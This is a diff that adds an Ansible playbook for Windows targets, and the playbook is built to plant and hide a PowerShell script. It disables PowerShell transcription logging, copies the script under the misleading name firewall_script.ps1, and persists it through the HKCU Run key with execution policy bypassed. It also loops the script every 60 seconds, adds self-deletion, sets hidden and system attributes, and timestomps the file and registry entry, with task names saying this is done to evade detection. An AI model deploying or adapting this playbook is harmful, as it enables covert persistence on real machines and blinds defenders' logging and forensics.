@@ -1,0 +1,63 @@
+---
+- name: Disable PowerShell logging by modifying the registry
+  win_registry:
+    path: "HKLM:\Software\Policies\Microsoft\Windows\PowerShell"
+    name: "EnableTranscripting"
+    type: dword
+    data: "0"
+    state: present
+    
+- name: Copy PowerShell script to target
+  win_copy:
+    src: "files/doubletap.ps1"
+    dest: "C:\\Windows\\Temp\\firewall_script.ps1"
+
+- name: Add script to Run registry key to execute at startup
+  win_regedit:
+    path: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    name: "DoubleTapScript"
+    data: "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\firewall_script.ps1"
+    state: present
+
+- name: Ensure PowerShell script runs every 60 seconds by adding a loop at the start and end
+  win_lineinfile:
+    path: "C:\\Windows\\Temp\\firewall_script.ps1"
+    line: |
+      while ($true) {
+    insertafter: "^(# Start)$"
+
+- name: Add start-sleep and closing brace to end of the PowerShell script
+  win_lineinfile:
+    path: "C:\\Windows\\Temp\\firewall_script.ps1"
+    line: |
+      Start-Sleep -Seconds 60
+      }
+    insertafter: "^(# End)$"
+
+- name: Add script deletion at the end of the PowerShell script
+  win_lineinfile:
+    path: "C:\\Windows\\Temp\\firewall_script.ps1"
+    line: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'
+    insertafter: 'Log " My work here is done"''
+
+- name: Apply hidden and system attributes to the PowerShell script
+  win_shell: |
+    attrib +h +s "C:\\Windows\\Temp\\firewall_script.ps1"
+
+- name: Timestomp script and task to evade detection
+  win_shell: |
+    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+    (Get-Item "C:\\Windows\\Temp\\firewall_script.ps1").CreationTime = $time
+    (Get-Item "C:\\Windows\\Temp\\firewall_script.ps1").LastWriteTime = $time
+    (Get-Item "C:\\Windows\\Temp\\firewall_script.ps1").LastAccessTime = $time
+  args:
+    executable: powershell.exe
+
+- name: Timestomp registry key to evade detection
+  win_shell: |
+    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DoubleTapScript").CreationTime = $time
+    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DoubleTapScript").LastWriteTime = $time
+    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DoubleTapScript").LastAccessTime = $time
+  args:
+    executable: powershell.exe
